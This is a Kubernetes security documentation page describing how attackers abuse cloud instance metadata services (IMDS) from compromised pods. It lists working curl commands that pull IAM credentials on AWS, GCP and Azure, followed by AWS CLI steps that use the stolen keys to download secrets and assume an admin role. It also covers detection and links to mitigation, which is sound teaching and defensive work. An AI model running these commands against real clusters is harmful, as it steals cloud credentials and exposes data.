---
sidebar_position: 21
title: Cloud Metadata Service Abuse
description: How attackers exploit cloud provider metadata services (IMDS) from Kubernetes pods to steal IAM credentials and escalate privileges.
keywords:
  - kubernetes cloud security
  - IMDS attack
  - instance metadata service
  - AWS metadata
  - GCP metadata
  - Azure IMDS
  - cloud credential theft
  - IAM role theft
  - kubernetes privilege escalation
  - cloud security
tags: [attack-vector, privilege-escalation, cloud-security, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/cloud-metadata-mitigation/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/network-policies/
  - /kubernetes-security/attack-vectors/service-account-token-abuse/
  - /kubernetes-security/fundamentals/the-4-c-cloud-native-security/
---

# Cloud Metadata Service Abuse

Cloud providers expose an Instance Metadata Service (IMDS) at a well-known IP address (`169.254.169.254`) that allows workloads to retrieve instance metadata, including temporary IAM credentials. In Kubernetes clusters running on cloud infrastructure (AWS EKS, GCP GKE, Azure AKS), pods can access this service by default, enabling attackers to steal cloud credentials and escalate privileges beyond the cluster.

This attack is particularly dangerous because compromised pods can obtain the same IAM permissions as the underlying node, potentially granting access to cloud resources like S3 buckets, databases, secrets managers, and other services.

---

## Exploitation Steps

An attacker who has gained code execution inside a pod (through a vulnerability, misconfiguration, or compromised application) can exploit the metadata service to steal cloud credentials.

### 1. Verify Metadata Service Accessibility

The attacker first confirms that the metadata service is reachable from within the pod:

```bash
curl -s http://169.254.169.254/
```

If accessible, this returns metadata API version paths.

---

### 2. Retrieve IAM Credentials (AWS)

On AWS EKS, the attacker queries the metadata service to retrieve the node's IAM role credentials:

```bash
# Get the IAM role name
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Retrieve temporary credentials for the role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

This returns:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEBYaDK...",
  "Expiration": "2026-01-22T12:00:00Z"
}
```

---

### 3. Retrieve IAM Credentials (GCP)

On GCP GKE, the attacker queries the GCE metadata server:

```bash
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

This returns an OAuth2 access token:

```json
{
  "access_token": "ya29.c.Kp8B...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

---

### 4. Retrieve IAM Credentials (Azure)

On Azure AKS, the attacker queries the Azure IMDS:

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

This returns an Azure AD access token for the managed identity.

---

### 5. Exfiltrate Sensitive Data Using Stolen Credentials

With the stolen credentials, the attacker can access cloud resources. For example, on AWS:

```bash
# Configure AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDK..."

# List S3 buckets
aws s3 ls

# Download sensitive data
aws s3 cp s3://company-secrets/credentials.json ./

# Access Secrets Manager
aws secretsmanager get-secret-value --secret-id production/database
```

---

### 6. Escalate Privileges in the Cloud Environment

Depending on the node's IAM permissions, the attacker may be able to:

- Access databases (RDS, Cloud SQL, Cosmos DB)
- Read secrets from cloud secret managers
- Modify cloud infrastructure (EC2, Compute Engine, VMs)
- Access container registries (ECR, GCR, ACR)
- Assume other IAM roles for further privilege escalation

```bash
# Attempt to assume another role (AWS)
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name AttackerSession
```

---

### Result

The attacker gains access to cloud IAM credentials with the same permissions as the Kubernetes node. This can lead to:

- **Data exfiltration** from cloud storage and databases
- **Lateral movement** to other cloud services and accounts
- **Cluster compromise** by accessing secrets or modifying infrastructure
- **Persistent access** by creating new IAM users or roles

---

## Real-World Impact

This attack vector has been exploited in several high-profile breaches:

- **Capital One (2019)**: An attacker exploited SSRF to access EC2 metadata and steal credentials, leading to the exposure of 100 million customer records.
- **Numerous bug bounty findings**: IMDS attacks are commonly reported in cloud-hosted applications.

The attack affects any pod running on cloud infrastructure unless explicit mitigations are in place.

---

## Detection

Signs of metadata service abuse include:

- Unusual network traffic to `169.254.169.254` from pods
- CloudTrail/Cloud Audit logs showing API calls from unexpected source IPs
- IAM credential usage from locations or services that don't normally access them
- Failed authentication attempts with node-level credentials

```bash
# Check Falco logs for metadata service access attempts
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=1000 | grep "169.254.169.254"
```

---

## Mitigation

For guidance on how to prevent this attack vector, refer to the mitigation article:

[Cloud Metadata Service Mitigation](/kubernetes-security/best-practices/cluster-setup-and-hardening/network-security/cloud-metadata-mitigation/)

---

## References

This article is based on information from the following official sources:

1. [Instance Metadata and User Data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) - AWS Documentation
2. [Storing and retrieving instance metadata](https://cloud.google.com/compute/docs/metadata/overview) - Google Cloud Documentation
3. [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service) - Microsoft Azure Documentation
4. [EKS Best Practices Guide - Restrict access to the instance profile](https://aws.github.io/aws-eks-best-practices/security/docs/iam/#restrict-access-to-the-instance-profile-assigned-to-the-worker-node) - AWS EKS Best Practices
